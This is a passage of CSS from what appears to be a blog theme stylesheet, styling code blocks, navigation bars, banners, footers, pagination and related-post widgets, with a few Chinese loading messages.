ease-out; -moz-transition: transform 0.2s ease-out; -webkit-transition: transform 0.2s ease-out; -o-transition: transform 0.2s ease-out; } .l_body[leftbar] .float-panel, .l_body[rightbar] .float-panel { box-shadow: 0 0 4px -1px #1cd0fd, 0 0 16px -4px #1cd0fd, 0 0 32px -12px #1cd0fd, 0 0 128px -32px #1cd0fd; } .l_body[leftbar] .float-panel button.leftbar-toggle { background: var(--alpha100); } .l_body[leftbar] .float-panel button.leftbar-toggle { color: #1cd0fd; border-color: var(--block-border); } .l_body[leftbar] .float-panel button.leftbar-toggle svg g { fill: currentColor; fill-opacity: 0.3; } .l_body[leftbar] .float-panel button.leftbar-toggle svg g path#sep { transform: translateX(2px); } .l_body .l_right:empty+.float-panel button.rightbar-toggle { display: none !important; } .l_body[rightbar] .float-panel button.rightbar-toggle { background: var(--alpha100); } .l_body[rightbar] .float-panel button.rightbar-toggle { color: #1cd0fd; border-color: var(--block-border); } .l_body[rightbar] .float-panel button.rightbar-toggle svg g { fill: currentColor; fill-opacity: 0.3; } .l_body[rightbar] .float-panel button.rightbar-toggle svg g path#sep { transform: translateX(2px); } code { -webkit-font-smoothing: auto; -moz-osx-font-smoothing: auto; font-family: Menlo, Monaco, Consolas, system-ui, \"Courier New\", monospace, sans-serif; } p>code:not([class]), li>code:not([class]) { font-size: 85%; background: var(--block); padding: 0.2em; border-radius: 4px; color: var(--text-code); } .md-text .highlight, pre:not([class]):has(>code) { margin: var(--gap-p) 0; border-radius: 12px; overflow: hidden; background: var(--block); line-height: 1.5; font-family: Menlo, Monaco, Consolas, system-ui, \"Courier New\", monospace, sans-serif; box-sizing: border-box; } @media screen and (min-width: 500px) { .md-text .highlight, pre:not([class]):has(>code) { min-width: 180px; } } .md-text .highlight { position: relative; overflow: auto; display: block; } .md-text .highlight figcaption { color: var(--text-p2); font-size: 0.8125rem; font-weight: 500; margin-left: 0.5rem; display: inline-block; } .md-text .highlight figcaption span { padding: 4px 0.5rem; display: block; border-bottom-left-radius: 4px; border-bottom-right-radius: 4px; background: var(--block-hover); } .md-text .highlight >table { overflow: auto; display: block; margin: 0 !important; background: transparent; border: none; } .md-text .highlight >table td, .md-text .highlight >table th { padding: 0; border: none; line-height: 1.5; } .md-text .highlight >table::-webkit-scrollbar { height: 4px; width: 4px; } .md-text .highlight >table::-webkit-scrollbar-track-piece { background: transparent; } .md-text .highlight >table::-webkit-scrollbar-thumb { background: transparent; cursor: pointer; border-radius: 8px; } .md-text .highlight >table:hover::-webkit-scrollbar-thumb { background: var(--text-meta); } .md-text .highlight >table:hover::-webkit-scrollbar-thumb:hover { background: var(--text-p3); } .md-text .highlight >table tr { background: transparent; } .md-text .highlight >table tr:hover { background: transparent; } .md-text .highlight .gutter { pointer-events: none; -moz-user-select: none; -ms-user-select: none; -webkit-user-select: none; user-select: none; text-align: right; padding: 0 1em; border-width: 0; margin-left: 0; left: 0; z-index: 1; } .md-text .highlight .gutter pre .line { color: var(--text-p4); } .md-text .highlight .code pre { display: block; padding: 0.5em 1rem; } .md-text .highlight .gutter+.code pre { padding-left: 0.25em; } .md-text .gist .gist-file { border: 1px solid var(--block-border); border-radius: 12px; overflow: hidden; } .md-text .gist .gist-data { border-bottom: 1px solid var(--block-border); } .md-text .gist .highlight { display: inherit; border: none; border-radius: 0; background: var(--block); margin: 0; padding: 1em 0; } .md-text .gist .blob-code-inner { color: var(--text-p1); font-family: Menlo, Monaco, Consolas, system-ui, \"Courier New\", monospace, sans-serif; } .md-text .gist .gist-meta { background: var(--block-border); } table:not([class]) { border-collapse: collapse; } .md-text pre >.caption { color: var(--text-p3); } .md-text pre >.hljs { padding: 1rem; border-radius: 12px; line-height: 1.5; box-sizing: border-box; } .md-text .highlight .code { vertical-align: top; } .md-text .highlight .code:before { position: absolute; top: 0; right: 0; padding: 4px 0.5rem; opacity: 0.25; font-weight: 700; color: var(--theme); } .md-text .highlight.yaml .code:before { content: \"YAML\"; } .md-text .highlight.json .code:before { content: \"JSON\"; } .md-text .highlight.diff .code:before { content: \"diff\"; } .md-text .highlight.html .code:before { content: \"HTML\"; } .md-text .highlight.js .code:before, .md-text .highlight.javascript .code:before { content: \"JS\"; } .md-text .highlight.css .code:before { content: \"CSS\"; } .md-text .highlight.less .code:before { content: \"Less\"; } .md-text .highlight.stylus .code:before { content: \"Stylus\"; } .md-text .highlight.bash .code:before { content: \"bash\"; } .md-text .highlight.shell .code:before { content: \"shell\"; } .md-text .highlight.sh .code:before { content: \"sh\"; } .md-text .highlight.ini .code:before { content: \"ini\"; } .md-text .highlight.c .code:before { content: \"C\"; } .md-text .highlight.cpp .code:before { content: \"C++\"; } .md-text .highlight.objc .code:before, .md-text .highlight.objectivec .code:before { content: \"Objective-C\"; } .md-text .highlight.swift .code:before { content: \"Swift\"; } .md-text .highlight.java .code:before { content: \"Java\"; } .md-text .highlight.python .code:before { content: \"Python\"; } .md-text .highlight.php .code:before { content: \"PHP\"; } .md-text .highlight.rust .code:before, .md-text .highlight.rs .code:before { content: \"Rust\"; } .md-text .highlight.sql .code:before { content: \"SQL\"; } .md-text .highlight.ruby .code:before { content: \"Ruby\"; } .md-text .highlight.makefile .code:before { content: \"Makefile\"; } .md-text .highlight.go .code:before { content: \"Go\"; } .md-text .highlight.typescript .code:before, .md-text .highlight.ts .code:before { content: \"TS\"; } .md-text .highlight.matlab .code:before { content: \"MATLAB\"; } .code>pre .code:before { display: none; } .code>pre .line, .code>pre .params { color: var(--text-p1); } .code>pre .line .addition { color: #3fa33f; } .code>pre .line .deletion { color: #ee2b29; } .code>pre .marked { background-color: rgba(254,213,66,0.4); padding: 2px 8px 2px 0; border-radius: 2px; width: 100%; } .code>pre .title, .code>pre .attr, .code>pre .attribute { color: #3f51b5; } .code>pre .comment { color: var(--text-p4); font-style: italic; } .code>pre .keyword, .code>pre .meta-keyword, .code>pre .javascript .function { color: #8959a8; } .code>pre .type, .code>pre .built_in, .code>pre .tag .name { color: #2196f3; } .code>pre .variable, .code>pre .regexp, .code>pre .ruby .constant, .code>pre .xml .tag .title, .code>pre .xml .pi, .code>pre .xml .doctype, .code>pre .html .doctype, .code>pre .css .id, .code>pre .css .class, .code>pre .css .pseudo { color: #fd8607; } .code>pre .number, .code>pre .preprocessor, .code>pre .literal, .code>pre .constant { color: #fd8607; } .code>pre .class, .code>pre .ruby .class .title, .code>pre .css .rules .attribute { color: #ff9800; } .code>pre .string, .code>pre .meta-string { color: #449e48; } .code>pre .value, .code>pre .inheritance, .code>pre .header, .code>pre .ruby .symbol, .code>pre .xml .cdata { color: #4caf50; } .code>pre .css .hexcolor { color: #6cc; } .code>pre .function, .code>pre .python .decorator, .code>pre .python .title, .code>pre .ruby .function .title, .code>pre .ruby .title .keyword, .code>pre .perl .sub, .code>pre .javascript .title, .code>pre .coffeescript .title { color: #69c; } .highlight.html .line .tag .name, .highlight.css .line .tag .name, .highlight.less .line .tag .name, .highlight.stylus .line .tag .name, .highlight.html .line .selector-tag, .highlight.css .line .selector-tag, .highlight.less .line .selector-tag, .highlight.stylus .line .selector-tag { color: #ee2b29; } .highlight.html .line .selector-class, .highlight.css .line .selector-class, .highlight.less .line .selector-class, .highlight.stylus .line .selector-class, .highlight.html .line .selector-attr, .highlight.css .line .selector-attr, .highlight.less .line .selector-attr, .highlight.stylus .line .selector-attr { color: #fd8607; } .highlight.html .line .attribute, .highlight.css .line .attribute, .highlight.less .line .attribute, .highlight.stylus .line .attribute { color: #3f51b5; } .highlight.html .line .number, .highlight.css .line .number, .highlight.less .line .number, .highlight.stylus .line .number { color: #17afca; } .highlight.objc .line .meta, .highlight.objectivec .line .meta, .highlight.swift .line .meta, .highlight.c .line .meta { color: #8959a8; } .highlight.objc .line .class, .highlight.objectivec .line .class, .highlight.swift .line .class, .highlight.c .line .class { color: var(--text-p1); } .highlight.json .line .attr { color: #e24f5a; } .highlight.json .line .literal { color: #3f51b5; } .highlight.yaml .line .attr { color: #e24f5a; } * { outline: none; } html { font-family: system-ui, \"Microsoft Yahei\", \"Segoe UI\", -apple-system, Roboto, Ubuntu, \"Helvetica Neue\", Arial, \"WenQuanYi Micro Hei\", sans-serif; font-size: 16px; -webkit-text-size-adjust: 100%; -ms-text-size-adjust: 100%; scroll-padding-top: 8px; } body { background: var(--site-bg); margin: 0; -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizelegibility; -webkit-tap-highlight-color: rgba(0,0,0,0); } div.lazy.img { width: 100%; height: 100%; background-position: center; background-size: cover; } input { background: none; border: none; } input.copy-area { display: block; font-family: Menlo, Monaco, Consolas, system-ui, \"Courier New\", monospace, sans-serif; font-size: 0.8125rem; font-weight: 700; color: var(--text-p3); } .flex { display: flex; align-items: center; } .flex.column { flex-direction: column; } svg.loading { display: block; position: absolute; color: var(--text-p3); z-index: -1; width: 100%; height: 2rem; margin: auto; animation: spin infinite 2s; animation-timing-function: linear; } @-moz-keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } } @-webkit-keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } } @-o-keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } } @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } } .loading-wrap { margin: 0; text-align: center; background: var(--block); border-radius: 12px; position: relative; padding: 2rem; } .loading-wrap svg { margin: 4px; } .loading-wrap:after { content: '正在加载'; color: var(--text-p1); display: block; font-size: 14px; } .loading-wrap.error:after { content: '加载失败，请稍后重试。'; } audio, video { max-width: 100%; } video { z-index: 1; } pre:not([class]):has(>code) { display: block; padding: 1rem; overflow: auto; } pre:not([class]):has(>code) code { padding: 0; } span.dot, span.sep { font-size: 0.9em; margin: 0 0.25em; } span.dot:before { content: '·'; font-weight: 900; } span.sep:before { content: '/'; padding-left: 2px; padding-right: 2px; } svg.icon { width: 1em; height: 1em; vertical-align: middle; fill: currentColor; overflow: hidden; } svg.active-icon { color: #1cd0fd; } h1, .h1 { font-size: var(--fsh2); font-weight: 700; } @media screen and (max-width: 500px) { h1, .h1 { font-size: var(--fsh2); } } h2, .h2 { font-size: var(--fsh2); margin-top: 1.5em; } h3, .h3 { font-size: var(--fsh3); } h4, .h4 { font-size: var(--fsh4); } h5 { font-size: calc(var(--fsp) + 1px); } h6 { font-size: calc(var(--fsp) + 0px); } .fs15 { --fsp: 0.9375rem; font-size: var(--fsp); } .fs14 { --fsp: 0.875rem; font-size: var(--fsp); } .footnote { --fsp: 0.8125rem; font-size: var(--fsp); } .widgets .post-title { margin: 0.75rem 0; line-height: 1.2; display: block; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; } .widgets .post-title .cap { margin-bottom: 2px; opacity: 0.5; } .widgets .post-title a { color: inherit; font-weight: 500; } .widgets .post-title a:hover { color: #ff5724; } div.toast { max-width: 60%; padding: 1rem 2rem; line-height: 1.5; color: var(--text-p1); font-weight: 500; text-align: center; border-radius: 8px; background: var(--card); position: fixed; left: 50%; top: 32px; transform: translateX(-50%); z-index: 9; -moz-user-select: none; -ms-user-select: none; -webkit-user-select: none; user-select: none; box-shadow: 0 4px 8px 0px rgba(0,0,0,0.1), 0 12px 16px -4px rgba(0,0,0,0.2); visibility: hidden; } div.toast.show { visibility: visible; -webkit-animation: fadein 0.5s, fadeout 0.5s 2s; animation: fadein 0.5s, fadeout 0.5s 2s; animation-fill-mode: forwards; } @-webkit-keyframes fadein { from { top: -64px; opacity: 0; } to { top: 32px; opacity: 1; } } @-webkit-keyframes fadeout { from { top: 32px; opacity: 1; } to { top: -64px; opacity: 0; } } @-moz-keyframes fadein { from { top: -64px; opacity: 0; } to { top: 32px; opacity: 1; } } @-webkit-keyframes fadein { from { top: -64px; opacity: 0; } to { top: 32px; opacity: 1; } } @-o-keyframes fadein { from { top: -64px; opacity: 0; } to { top: 32px; opacity: 1; } } @keyframes fadein { from { top: -64px; opacity: 0; } to { top: 32px; opacity: 1; } } @-moz-keyframes fadeout { from { top: 32px; opacity: 1; } to { top: -64px; opacity: 0; } } @-webkit-keyframes fadeout { from { top: 32px; opacity: 1; } to { top: -64px; opacity: 0; } } @-o-keyframes fadeout { from { top: 32px; opacity: 1; } to { top: -64px; opacity: 0; } } @keyframes fadeout { from { top: 32px; opacity: 1; } to { top: -64px; opacity: 0; } } .article.banner { --text-banner: var(--text); background: var(--block); margin: 0; height: unset; } .article.banner .bg+.content { min-height: 224px; --text-banner: #fff; --button-hover-bg: rgba(255,255,255,0.25); } .article.banner .content .top { align-items: flex-start; margin: 1rem calc(1rem - 4px); } .article.banner .content .title { font-size: calc(17px + 9px); color: var(--text-banner); } .article.banner .content h1 { line-height: 1.2; margin: 0.25rem 0; } .l_body .article.banner .content .bottom.only-title .title { padding: 0.75rem 0; } .l_body[text-indent] .article.banner .content .bottom.only-title { justify-content: center; } .article.banner .bg+.content { transition: all 0.2s ease-out; -moz-transition: all 0.2s ease-out; -webkit-transition: all 0.2s ease-out; -o-transition: all 0.2s ease-out; --blur-bg: rgba(0,0,0,0); --blur-px: 0px; --blur-sat: 100%; background: var(--blur-bg); } @supports ((-webkit-backdrop-filter: blur(var(--blur-px))) or (backdrop-filter: blur(var(--blur-px)))) { .article.banner .bg+.content { background: var(--blur-bg); backdrop-filter: saturate(var(--blur-sat)) blur(var(--blur-px)); -webkit-backdrop-filter: saturate(var(--blur-sat)) blur(var(--blur-px)); } } .article.banner:hover .bg+.content { --blur-bg: rgba(0,0,0,0.1); --blur-px: 20px; --blur-sat: 150%; } .article.banner { --button-hover-bg: rgba(0,0,0,0.05); } :root[data-theme=\"dark\"] .article.banner { --button-hover-bg: rgba(255,255,255,0.15); } @media (prefers-color-scheme: dark) { :root:not([data-theme]) .article.banner { --button-hover-bg: rgba(255,255,255,0.15); } } .md-text .article-footer { margin-top: 4rem; padding: 1rem; background: var(--block); border-radius: 12px; border: 1px solid var(--block-border); } .md-text .article-footer:empty { display: none; } .md-text .article-footer .header { font-weight: 500; color: var(--text-p2); font-size: calc(17px + 2px); } .md-text .article-footer .body { --fsp: calc(17px - 2px); } .md-text .article-footer .body input.copy-area { margin: 0.75rem 0; padding: 0; width: 100%; } .md-text .article-footer .body p { color: var(--text-p2); margin: 0.5em 0; } .md-text .article-footer .body p a { font-weight: unset; } .md-text .article-footer .body ul { margin: 0; overflow: hidden; } .md-text .article-footer .body .post-title { margin: 2px 0; line-height: 1.2; word-break: break-all; } .md-text .article-footer .body .post-title p { --fsp: calc(17px - 2px); } .md-text .article-footer section+section { margin-top: 1rem; padding-top: 1rem; border-top: 1px solid var(--block-border); } .md-text .article-footer .social-wrap { grid-gap: 0.5rem 1rem; margin: 0; } .md-text .article-footer .qrcode { width: 128px; padding: 4px; background: #fff; border-radius: 4px; box-shadow: 0 4px 8px 0px rgba(0,0,0,0.1), 0 0 32px 0px rgba(0,0,0,0.1); overflow: hidden; transition: all 0.2s ease-out; -moz-transition: all 0.2s ease-out; -webkit-transition: all 0.2s ease-out; -o-transition: all 0.2s ease-out; height: 0; margin: 0 auto; transform: scale(0.01); } .md-text .article-footer .qrcode img { object-fit: contain; } .md-text .article-footer .qrcode.display { margin: 2rem auto 1rem; height: 128px !important; opacity: 1 !important; transform: scale(1); } .bread-nav { font-weight: 500; display: flex; justify-content: space-between; color: var(--text-banner); } .bread-nav .flex-row { display: flex; align-items: baseline; flex-direction: row; } .bread-nav a { color: var(--text-banner); padding: 4px; border-radius: 2px; } .bread-nav a:hover { background: var(--button-hover-bg); } .bread-nav span { color: var(--text-banner); } .bread-nav span.sep { opacity: 0.5; margin: 0; } .bread-nav span.text { padding: 4px; } .bread-nav div#post-meta span.sep:before { content: '|'; } .bread-nav div#post-meta span.updated { visibility: hidden; } .bread-nav:hover div#post-meta span.updated { visibility: visible; } .bread-nav .ghrepo { font-size: 0.8125rem; display: flex; flex-direction: column; align-items: flex-start; border-left: 1px solid var(--text-meta); padding-left: 8px; } .bread-nav .ghrepo a { display: flex; align-items: center; color: var(--text-banner); } .bread-nav .ghrepo a svg { margin-right: 4px; } .bread-nav .ghrepo a.bold { font-weight: 600; color: var(--text-banner); } .bread-nav .ghrepo a span { margin-left: 4px; } .bread-nav .ghrepo a:hover { opacity: 1; } .l_cover { height: 100vh; text-align: center; display: flex; flex-direction: column; justify-content: center; align-items: center; position: relative; } .l_cover.post { height: inherit; } .l_cover .cover-wrap { margin-bottom: 0; display: flex; flex-direction: column; justify-content: center; align-items: center; font-size: var(--fsp); } .l_cover .cover-wrap .cover-title { font-weight: 700; font-size: 1.5rem; margin: 1rem 0; line-height: 1.2; color: var(--text); } .l_cover .cover-wrap .description { margin: 1rem 0; } .l_cover .cover-wrap .start-wrap { margin: 2rem 0; flex-shrink: 0; } .l_cover .cover-wrap .start-wrap a.start { display: inline-block; } .l_cover.post .cover { z-index: -1; width: 100%; height: 30vh; max-width: 2048px; min-height: 150px; max-height: 400px; } @media screen and (max-width: 768px) { .l_cover.post .cover { height: 25vh; } } @media screen and (max-width: 500px) { .l_cover.post .cover { height: 20vh; } } @media screen and (min-width: 2048px) { .l_cover.post .cover { margin-top: 4rem; } .l_cover.post .cover .img { border-radius: 2rem; } } .l_cover.wiki .cover-wrap { max-width: 500px; } .l_cover.wiki .cover-wrap .preview { margin-bottom: 2rem; } .l_cover.wiki .cover-wrap .preview img { object-fit: contain; min-width: 96px; min-height: 96px; max-height: 35vh; max-width: 100%; } @media screen and (max-width: 500px) { .l_cover.wiki .cover-wrap .preview img { max-width: 60%; } } .l_cover.wiki .cover-wrap .cover-title:first-child { font-size: 3rem; } .page-footer { margin: 4rem 1rem 3rem; color: var(--text-p2); } .page-footer a { color: var(--text-p2); border-radius: 4px; transition: background 0.2s ease-out; } .page-footer a:hover { color: var(--text); background: var(--block-hover); } .page-footer .sitemap { margin: 0.5rem -4px 2rem; display: grid; scrollbar-width: none; grid-gap: 1rem 1rem; grid-auto-flow: column dense; grid-template-columns: repeat(4, 1fr); overflow: scroll; } .page-footer .sitemap::-webkit-scrollbar { height: 0; width: 0; } .page-footer .sitemap::-webkit-scrollbar-track-piece { background: transparent; } .page-footer .sitemap::-webkit-scrollbar-thumb { background: var(--text-meta); cursor: pointer; border-radius: 0; } .page-footer .sitemap::-webkit-scrollbar-thumb:hover { background: var(--text-p3); } .page-footer .sitemap .sitemap-group { display: flex; flex-direction: column; align-items: flex-start; } .page-footer .sitemap .sitemap-group >span, .page-footer .sitemap .sitemap-group >a { text-decoration: none; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; padding: 4px; } .page-footer .sitemap .sitemap-group >span { font-weight: 500; color: var(--text-p1); margin: 4px 0; } .page-footer .text p { margin: 4px 0; line-height: 1.5; } .page-footer .text a:not([class]) { font-weight: 500; } .navbar { padding: 0 1rem; z-index: 8; top: 0; background: var(--site-bg); position: sticky; position: -webkit-sticky; margin-bottom: 1px; margin-top: -8px; } .navbar:after { content: ''; height: 2px; border-radius: 2px; position: absolute; bottom: 0; left: 1rem; right: 1rem; background: var(--block-hover); } .navbar nav { display: flex; overflow: scroll visible; font-size: 0.875rem; } .navbar nav::-webkit-scrollbar { height: 0; width: 0; } .navbar nav::-webkit-scrollbar-track-piece { background: transparent; } .navbar nav::-webkit-scrollbar-thumb { background: var(--text-meta); cursor: pointer; border-radius: 0; } .navbar nav::-webkit-scrollbar-thumb:hover { background: var(--text-p3); } .navbar nav >p { margin: 0; } .navbar nav a { padding: 2px 0.75rem; margin: 10px 0.25rem 8px 0.25rem; line-height: 2; color: var(--text-p3); border-radius: 4px; font-weight: 500; white-space: nowrap; position: relative; z-index: 1; } .navbar nav a:after { height: 2px; position: absolute; bottom: -8px; left: 0.75rem; right: 0.75rem; background: #1cd0fd; border-radius: 2px; pointer-events: none; } .navbar nav a:hover { background: var(--block-hover); } .navbar nav a.active, .navbar nav a:hover { color: var(--text-p1); } .navbar nav a.active { background: var(--card); box-shadow: 0 0 2px 0px rgba(0,0,0,0.04), 0 0 8px 0px rgba(0,0,0,0.04); cursor: default; pointer-events: none; } .navbar nav a.active:after { content: ''; } .navbar nav a+a { margin-left: 4px; } @media screen and (max-width: 667px) { .navbar.top { margin-top: 0; padding-left: 0; padding-right: 0; } .navbar.top nav a:first-child { margin-left: 1rem; } .navbar.top nav a:last-child { margin-right: 1rem; } } .paginator-wrap { margin: 1rem; display: flex; justify-content: space-between; align-items: center; font-size: 1rem; font-weight: 700; background: var(--card); border-radius: 12px; overflow: hidden; box-shadow: 0 2px 8px 0px rgba(0,0,0,0.03); color: var(--text-p3); } .paginator-wrap .page-number { padding: 4px 8px; border-radius: 8px; margin: 2px; } .paginator-wrap a.page-number { color: var(--text-p3); } .paginator-wrap a.page-number:hover { color: var(--text-p1); background: var(--block); } .paginator-wrap .extend { text-align: center; background-size: contain; width: 1rem; height: 1rem; background-origin: content-box; background-clip: content-box; } .paginator-wrap .extend.next { border-left: 1px dashed var(--block-border); background-image: url(\"https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/arrow/064b95430caf4.svg\"); } .paginator-wrap .extend.prev { border-right: 1px dashed var(--block-border); background-image: url(\"https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/arrow/f049bbd4e88ec.svg\"); } .paginator-wrap .current { font-family: Menlo, Monaco, Consolas, system-ui, \"Courier New\", monospace, sans-serif; background: var(--block); } .paginator-wrap .extend { padding: 1rem; line-height: 0; filter: grayscale(100%); } .paginator-wrap .extend img { height: 1rem; } .paginator-wrap .extend.disable { pointer-events: none; } .paginator-wrap span.extend { opacity: 0.25; } .paginator-wrap a.extend:hover { filter: unset; } .related-wrap { padding: 0 1rem; margin: 4rem 0; } .related-wrap:empty { display: none; } .related-wrap section.header { display: flex; justify-content: space-between; align-items: center; } .related-wrap section.header >span.title { padding: 0.25rem 0; } .related-wrap section.footer { margin-top: 1rem; } .related-wrap a.more { padding: 0.25rem 0.5rem; border-radius: 8px; color: var(--text-p1); } article.md-text.content+.related-wrap { margin-top: 0; } .related-posts { max-width: 100%; margin: 1rem 0; } .related-posts .item { line-height: 1.2; display: block; border-left: 0; margin-top: 1rem; } .related-posts .item .title { color: var(--text-p1); font-weight: 500; --fsp: calc(17px - 1px); font-size: var(--fsp); transition: color 0.2s ease-out, border 0.2s ease-out; -moz-transition: color 0.2s ease-out, border 0.2s ease-out; -webkit-transition: color 0.2s ease-out, border 0.2s ease-out; -o-transition: color 0.2s ease-out, border 0.2s ease-out; position: relative; padding-bottom: 2px; border-bottom: 1px dashed var(--text-meta); line-height: 1.6; } .related-posts .item .excerpt { color: var(--text-p3); --fsp: calc(17px - 3px); font-size: var(--fsp); margin-top: 0.5rem; display: -webkit-box; -webkit-box-orient: vertical; overflow: hidden; -webkit-line-clamp: 2; } .related-posts .item.active .title { border-bottom: 1px dashed #1cd0fd; } .related-posts .item:hover .title { color: #ff5724; border-bottom: 1px solid #ff5724; } .related-wrap#read-next .body { display: grid; grid-gap: 16px; grid-template-columns: repeat(auto-fill, calc((100% - 1 * 16px) / 2)); } .related-wrap#read-next .body .item { border-top: 1px dashed var(--block-border); border-bottom: 1px dashed var(--block-border); padding: 1rem 0; } .related-wrap#read-next .body .note { margin-bottom: 0.75rem; font-size: 0.8125rem; color: var(--text-p4); font-weight: 500; } .related-wrap#read-next .body a { margin: 0; line-height: 1.2; color: var(--text-p1); font-size: calc(17px + 2px); } .related-wrap#read-next .body a:hover { color: #ff5724 !important; } .related-wrap#read-next .body #next { text-align: right; } .wiki+.related-wrap#read-next .item a { font-size: calc(17px + 7px); } .wiki+.related-wrap#read-next .item#prev a { color: var(--text-p3); } .related-wrap#comments { padding: 0 1rem; } .related-wrap#comments .cmt-title p { margin: 0; font-size: inherit; } .related-wrap#comments .cmt-title p a { --theme-link: #1cd0fd; --theme-link-opa: rgba(28,208,253,0.2); } .related-wrap#comments .cmt-body { min-height: 150px; position: relative; } .related-wrap#comments .cmt-body svg.loading { top: 60px; } .related-wrap#comments .cmt-body iframe { border-radius: 12px; border: none; width: 100%; } .tag-plugin.about { background: var(--block); border-radius: 12px; padding: 2rem; position: relative; } .tag-plugin.about .nav-back { display: none; position: absolute; line-height: 1; overflow: hidden; left: 0.75rem; top: 0.75rem; align-items: center; } @media screen and (max-width: 667px) { .tag-plugin.about .nav-back { display: flex; } } .tag-plugin.about .nav-back svg { width: 1rem; height: 1rem; } .tag-plugin.about .about-header { display: flex; justify-content: center; flex-wrap: wrap; margin: 1.5rem 0; } .tag-plugin.about .about-header img { object-fit: contain; } .tag-plugin.about .about-header >img { margin: auto 0; } .tag-plugin.about .about-header >p { font-size: 0.75rem; font-weight: 500; color: var(--text-p3); padding-top: 0.75rem; } .tag-plugin.about .about-header >p strong:first-child { font-size: 3rem; font-weight: 700; color: var(--text-p1); margin-right: 0.75rem; } .tag-plugin.about .about-header .avatar { display: inline-flex; margin: 0 1rem; } .tag-plugin.about .about-body >p { line-height: 1.5; } .tag-plugin.about .about-body >p:first-child { margin-top: 2.5rem; } .tag-plugin.about .about-body p+.tag-plugin.navbar .cap { margin-top: 1rem; } .tag-plugin.about .about-header+.about-body { margin-top: 2rem; } @media screen and (max-width: 500px) { .tag-plugin.about { padding: 2rem 1rem; } .tag-plugin.about .about-header p { width: 100%; } } .banner { border-radius: 12px; position: relative; overflow: hidden; display: flex; flex-direction: column; justify-content: flex-end; align-items: flex-start; height: 220px; } .banner.top { border-radius: 16px; } @media screen and (max-width: 667px) { .banner { height: 180px; } } .banner .bg { z-index: 0; } .banner .content { z-index: 1; width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: space-between; } .banner .content .top { display: flex; justify-content: space-between; align-items: center; line-height: 1; margin: 1rem; } .banner .content .top .tag-plugin.navbar { margin: 0; border-radius: 6px; padding: 2px; background: rgba(0,0,0,0.2); overflow: hidden; } .banner .content .top .tag-plugin.navbar:after { content: none; } .banner .content .top .tag-plugin.navbar .link { margin: 0; border-radius: 4px; color: rgba(255,255,255,0.8); padding: 2px 6px; background: none; line-height: 1.5; font-size: 0.9375rem; text-shadow: 0 0 1px rgba(0,0,0,0.12); } .banner .content .top .tag-plugin.navbar .link+.link { margin-left: 2px; } .banner .content .top .tag-plugin.navbar .link:after { content: none; } .banner .content .top .tag-plugin.navbar .link:hover { color: #fff; background: rgba(255,255,255,0.25); } .banner .content .top .tag-plugin.navbar .link.active { color: #fff; background: rgba(255,255,255,0.25); } .banner .content .top .back { background: none; padding: 0; line-height: 0; visibility: hidden; } @media screen and (max-width: 667px) { .banner .content .top .back { visibility: visible; } } .banner .content .top .back svg { width: 20px; height: 20px; fill: #fff; } .banner .banner-link { position: absolute; top: 0; bottom: 0; left: 0; right: 0; opacity: 0; z-index: 2; } .banner img { object-fit: cover; -moz-user-select: none; -ms-user-select: none; -webkit-user-select: none; user-select: none; margin: 0; height: 100%; width: 100%; } .banner img.bg { position: absolute; top: 0; bottom: 0; left: 0; right: 0; } .banner img.avatar { border-radius: 50%; width: 48px; height: 48px; } .banner .bottom { display: flex; padding: 1rem; width: 100%; box-sizing: border-box; } .banner .title { font-size: 1.5rem; font-weight: 600; } .banner .avatar+.text-area { margin-left: 0.75rem; } .banner .text-area .text { line-height: 1.2; margin-top: 0.25rem; margin-bottom: 0.25rem; } .banner .avatar+.text-area .title { font-size: 1.2rem; } .banner .subtitle { font-size: 0.875rem; } .banner .content:only-child { color: var(--text-p1); } .banner .bg+.content { color: #fff; } .banner .bg+.content .avatar { border: 2px solid #fff; margin: 0; } .banner .bg+.content .bottom { background-image: linear-gradient(rgba(0,0,0,0), rgba(0,0,0,0.2)); text-shadow: 0 0 1px rgba(0,0,0,0.12); } .tag-plugin.banner { transition: transform 2s ease-out; -moz-transition: transform 2s ease-out; -webkit-transition: transform 2s ease-out; -o-transition: transform 2s ease-out; } .tag-plugin.banner:hover img.bg { transform: scale(1.01); } .tag-plugin.banner .navbar a.active { background: var(--blur-bg); } @supports ((-webkit-backdrop-filter: blur(var(--blur-px))) or (backdrop-filter: blur(var(--blur-px)))) { .tag-plugin.banner .navbar a.active { background: var(--blur-bg) !important; backdrop-filter: saturate(200%) blur(var(--blur-px)); -webkit-backdrop-filter: saturate(200%) blur(var(--blur-px)); } } .tag-plugin.banner .navbar a.active:hover { background: var(--card); } @media screen and (max-width: 667px) { .banner.top { border-radius: 0; } } a.tag-plugin.button { background: var(--theme); color: var(--alpha100); display: inline-flex; align-items: center; justify-content: center; padding: 0 4px; transition: background 0.2s ease-out; -moz-transition: background 0.2s ease-out; -webkit-transition: background 0.2s ease-out; -o-transition: background 0.2s ease-out; margin-top: 8px; margin-bottom: 8px; } a.tag-plugin.button svg, a.tag-plugin.button img { height: 24px; width: auto; margin: 0 -0.5em 0 1em; flex-shrink: 0; } a.tag-plugin.button span { text-indent: 0; line-height: 24px; margin: 8px 1em; } a.tag-plugin.button[size='xs'] { margin: 0; border-radius: 2px; } a.tag-plugin.button[size='xs'] svg, a.tag-plugin.button[size='xs'] img { margin: 0 2px 0 0; height: 1em; } a.tag-plugin.button[size='xs'] span { margin: 0; } a.tag-plugin.button:hover { --theme: #ff5724; } .tag-plugin.grid a.tag-plugin.button { width: 100%; box-sizing: border-box; } .md-text .tag-plugin.checkbox { display: flex; align-items: center; font-size: 0.9375rem; line-height: 1.2; --gap-p: calc(var(--gap-p-compact) / 2); /* Checkbox */ /* Radio */ /* Colors */ } .md-text .tag-plugin.checkbox input { -webkit-appearance: none; -moz-appearance: none; -ms-appearance: none; -o-appearance: none; appearance: none; position: relative; height: 16px; width: 16px; cursor: pointer; display: inline-block; outline: none; border-radius: 2px; flex-shrink: 0; margin-right: 8px; pointer-events: none; } .md-text .tag-plugin.checkbox input[type=checkbox]:before, .md-text .tag-plugin.checkbox input[type=checkbox]:after { position: absolute; content: \"\"; background: 